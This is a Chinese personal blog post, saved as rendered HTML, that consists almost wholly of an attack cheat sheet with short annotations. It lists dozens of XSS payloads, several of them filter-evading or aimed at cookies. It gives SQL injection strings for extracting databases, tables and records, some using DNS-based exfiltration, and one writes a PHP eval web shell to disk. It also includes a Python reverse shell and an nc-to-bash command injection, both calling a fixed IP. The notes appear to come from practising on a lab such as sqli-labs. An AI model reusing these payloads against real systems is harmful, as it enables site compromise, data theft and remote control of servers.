@@ -1,0 +1,213 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>欢迎来到我的博客 | 欢迎来到我的博客</title><meta name="author" content="仰泳鱼"><meta name="copyright" content="仰泳鱼"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSS1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495反射型xss(get)&lt;s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="欢迎来到我的博客">
+<meta property="og:url" content="http://example.com/2024/08/18/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/index.html">
+<meta property="og:site_name" content="欢迎来到我的博客">
+<meta property="og:description" content="XSS1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495反射型xss(get)&lt;s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp">
+<meta property="article:published_time" content="2024-08-18T13:02:16.584Z">
+<meta property="article:modified_time" content="2024-08-20T02:10:01.648Z">
+<meta property="article:author" content="仰泳鱼">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp"><link rel="shortcut icon" href="https://www.emojiall.com/images/240/emojione/1f1e8-1f1f3.png"><link rel="canonical" href="http://example.com/2024/08/18/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '欢迎来到我的博客',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-20 10:10:01'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="欢迎来到我的博客"><span class="site-name">欢迎来到我的博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-18T13:02:16.584Z" title="发表于 2024-08-18 21:02:16">2024-08-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-20T02:10:01.648Z" title="更新于 2024-08-20 10:10:01">2024-08-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">反射型xss(get)</span><br><span class="line">&lt;script&gt;标签:</span><br><span class="line">&lt;script&gt;alert(&#x27;666&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(666)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(2)&gt;</span><br><span class="line"></span><br><span class="line">[&quot;&#x27;);alert(&#x27;XSS&#x27;);//&quot;]@xyz.xxx</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;666&#x27;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(666)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;666&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(666)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;svg/onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert`1`&gt;</span><br><span class="line"></span><br><span class="line">&lt;script/src=//@.Rs&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg&gt;标签:</span><br><span class="line">&lt;svg onload=&#x27;alert(1)&#x27;&gt;&lt;=&quot; &quot;span=&quot; &quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;标签:</span><br><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;标签:</span><br><span class="line">&lt;style onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;video&gt;标签</span><br><span class="line">&lt;video onloadstart=alert(1) src=&#x27;/media/hack-the-planet.mp4&#x27;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;img&gt;标签</span><br><span class="line">&lt;img src=1 onerror=alert(document.cookie)&gt;</span><br><span class="line">获取到cookie</span><br><span class="line"></span><br><span class="line">XSS</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&quot;123&quot;)&lt;/script&gt;</span><br><span class="line">\x22\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22\x31\x22\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;//获取cookie</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://www.baidu.com&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;c-comment-box&quot;&gt;&lt;/div&gt;&lt;script&gt;Function(atob(&#x27;YWxlcnQoYDFgKQ==&#x27;))();&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;/div&gt;&lt;script&gt;Function(atob(&#x27;YWxlcnQoYDFgKQ==&#x27;))();&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;/div&gt;&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;/div&gt;&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;//</span><br><span class="line"></span><br><span class="line">双开括号</span><br><span class="line">&quot;&gt;&lt;/div&gt;&lt;&lt;SCRIPT&gt;alert(&quot;1&quot;);//&lt;&lt;/SCRIPT&gt;//</span><br><span class="line">&quot;&gt;&lt;/div&gt;&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">内联框架注入</span><br><span class="line">&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line"></span><br><span class="line">超链接注入</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;漏洞&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">javascript链接：</span><br><span class="line">&quot;&gt;&lt;A HREF=&quot;javascript:document.location=&#x27;http://www.google.com/&#x27;&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">编辑器XSS</span><br><span class="line">%3Cp%3E1111111&quot;&gt;&lt;ImG sRc=1 OnErRoR=prompt(1)&gt;%3Cbr%2F%3E%3C%2Fp%3E</span><br><span class="line"></span><br><span class="line">&lt;p&gt;1111111&quot;&gt;&lt;ImG sRc=1 OnErRoR=prompt(2)&gt;&lt;br/&gt;&lt;/p&gt;//</span><br><span class="line"></span><br><span class="line">&lt;p&gt;1111111&quot;&gt;&lt;br/&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&quot;true&quot; &quot;ondragenter=confirm(1)&quot;src=&quot;alert(&lt;span class=&quot;code-snippet_number&quot;</span><br><span class="line"></span><br><span class="line">style=&quot;box-sizing:border-box;&quot;&gt;1&lt;/span&gt;)&quot;&gt;test111&quot;&quot;prompt(1)&quot;</span><br><span class="line"></span><br><span class="line">contenteditable&gt;test222&quot;&quot;autofocus tabindex=1&gt;test</span><br><span class="line"></span><br><span class="line">&quot;&quot;true&quot; ondragenter=confirm(1) style=&quot;width:100px,height:100px&quot;&gt;test&quot;1&lt;/span&gt;)&lt;span</span><br><span class="line"></span><br><span class="line">class=&quot;code-snippet_string&quot; style=&quot;box-sizing:border-box;&quot;&gt;&quot;&gt;&quot;</span><br><span class="line"></span><br><span class="line">frPid输入100000;var abc=top[&#x27;doc&#x27;+&#x27;ument&#x27;][&#x27;coo&#x27;+&#x27;kie&#x27;];top[&#x27;al&#x27;+&#x27;ert&#x27;](abc);var aa=&#x27;2 进行url编码后发送请求</span><br><span class="line">&lt;img src=1 onerror=co\u006efir\u006d`1223x&#x27;&gt;</span><br><span class="line"></span><br><span class="line">不常用标签&lt;h1&gt;</span><br><span class="line">&quot;&gt;&lt;h1&gt;XSS&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">看见框或者可以预览的话</span><br><span class="line">&lt;img src=&quot;1&quot; style=&quot;width:300px;height:200px;&quot;&gt;</span><br><span class="line">&lt;a href=&quot;1&quot;&gt;xss link&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aa&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;h1&gt;abc&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">system_user() /系统用户名</span><br><span class="line">user() /用户名</span><br><span class="line">current_user() /当前用户名</span><br><span class="line">session_user() /链接数据库的用户名</span><br><span class="line">database() /当前数据库名</span><br><span class="line">version() /数据库版本</span><br><span class="line">@@datadir  /数据库路径（绝对路径）</span><br><span class="line">@@basedir  /数据库安装路径</span><br><span class="line">@@version_compile_os /操作系统</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">判断注入点：</span><br><span class="line">http:/192.168.0.109:83/Less-1/?id=1&#x27; and 1=2-- -</span><br><span class="line">猜字段数：</span><br><span class="line">order by（二分法）</span><br><span class="line">http://192.168.0.109.83/Less-1/?id=2&#x27; order by 3---</span><br><span class="line">找回显：</span><br><span class="line">http://192.168.0.109.83/Less-1/?id=2&#x27; union select 1,2,3-- -</span><br><span class="line">找数据库</span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line">?id=1&#x27; order by 3--+ 判断字段数</span><br><span class="line">?id=-1&#x27; union select 1,database(),user()-- - 查询库名与用户</span><br><span class="line">?id=-1&#x27; union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())-- - 查询表名</span><br><span class="line">?id=-1&#x27; union select 1,database(),(select group_concat(column_name) from information _schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; )-- - 查询字段名</span><br><span class="line">?id=-1&#x27; union select 1,database(),(select group_concat(id,email_id) from emails)-- - 查询数据</span><br><span class="line"></span><br><span class="line">group concat()</span><br><span class="line">找表名字</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(table_name),@@datadir from information_schema.tables</span><br><span class="line">where table_schema=&quot;security&quot;-- -</span><br><span class="line">找字段名</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(column_name),@@datadir from information_schema.columns where table_name=&quot;emails&quot;-- -</span><br><span class="line">爆记录</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(id,email_id),3 from emails-- -</span><br><span class="line">查看内容</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(id),group_concat(email_id) from emails-- -</span><br><span class="line"></span><br><span class="line">if抓包：</span><br><span class="line">查询当前数据库名：if(substr((select database()),1,1)=&quot;s&quot;,1,2)=1</span><br><span class="line">查询用户名信息：if(substr((select group_concat(username) from users limit 0,1),1,1)=&quot;d&quot;,1,2=1</span><br><span class="line">if(substr((select group_concat(username) from users limit 0,1),1,1)=&quot;d&quot;,sleep(3),sleep(0))=1</span><br><span class="line"></span><br><span class="line">报错查询：</span><br><span class="line">查询当前数据库名：extractvalue(1,concat(0x7e,database(),0x7e))</span><br><span class="line">查询用户名信息：extractvalue(1,concat(0x7e,(select group_concat(username) from users limit 0,1),Ox7e))</span><br><span class="line">报错注入：admin&#x27;and/**/extractvalue(1,concat(char(126),md5(1836161162)))and&#x27;1&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and&#x27;</span><br><span class="line"></span><br><span class="line">时间注入(sleep、benchmark)</span><br><span class="line">1&quot; or if(substr((select database()),1,1)=&quot;s&quot;,1,2)=1-- -</span><br><span class="line">1&quot; or if(substr((select concat(table_name) from information_schema.tables where table_schema=&quot;zzzzz&quot;),1,1)=&quot;s&quot;,sleep(10),sleep(0))=1-- -</span><br><span class="line">id=1&quot; and sleep(10) &quot;1</span><br><span class="line"></span><br><span class="line">7关熟练 ?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;into outfile &quot;E://Phpstudy _x64//phpstudy_pro//www//php//3.php&quot;-- -</span><br><span class="line"></span><br><span class="line">9关不回显，通过睡眠时间来判断，通过burp抓包的接受响应时间来判断</span><br><span class="line"></span><br><span class="line">反弹shell</span><br><span class="line">python -c &#x27;import</span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([*/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br><span class="line">./update_cloudav &quot;a|nc 192.168.56.102 5555|/bin/bash|nc 192.168.56.102 6666&quot;</span><br><span class="line"></span><br><span class="line">26关a:空格代替失效：</span><br><span class="line">?id=0&#x27;llsubstr(database(),1,1)=&quot;s&quot;ll&#x27;</span><br><span class="line">?id=1&#x27;%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27;)%26%26substr(database(),1,1)=&quot;s&quot;;%00</span><br><span class="line"></span><br><span class="line">40关无显示(不能用报错，可用联合查询)</span><br><span class="line"></span><br><span class="line">SQL注入第五关利用dnslogo查询</span><br><span class="line">当前数据库名</span><br><span class="line">?id=1&#x27;and if((select load file(concat(&#x27;\\\\&#x27;,(select database0),&#x27;.xxxxx.ceye.io\\abc&#x27;))),1,1)--+</span><br><span class="line"></span><br><span class="line">数据库&#x27;security&#x27;中的表名</span><br><span class="line">?id=1&#x27;and if((select load file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),&#x27;.xxxxxx.ceye.io\\abc&#x27;))),1,1)--+</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">仰泳鱼</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/18/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/">http://example.com/2024/08/18/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">欢迎来到我的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/07/11/ZGr2mBLazCbIUAt.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/19/2024-08-19/" title="No.16"><img class="cover" src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">No.16</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/17/2024-08-17/" title="No.15"><img class="cover" src="https://s2.loli.net/2024/07/11/OkDMqp8b7muvN9C.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">No.15</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">仰泳鱼</div><div class="author-info__description">仅供分享个人研究成果</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1234567fang"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1234567fang" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">SQL注入</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/28/%E7%BD%91%E7%AB%99/" title="无题"><img src="https://s2.loli.net/2024/07/11/3p72al5i9FCwBKj.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/11/28/%E7%BD%91%E7%AB%99/" title="无题">无题</a><time datetime="2024-11-28T15:06:47.091Z" title="发表于 2024-11-28 23:06:47">2024-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/02/2024-11-02/" title="实训周"><img src="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" 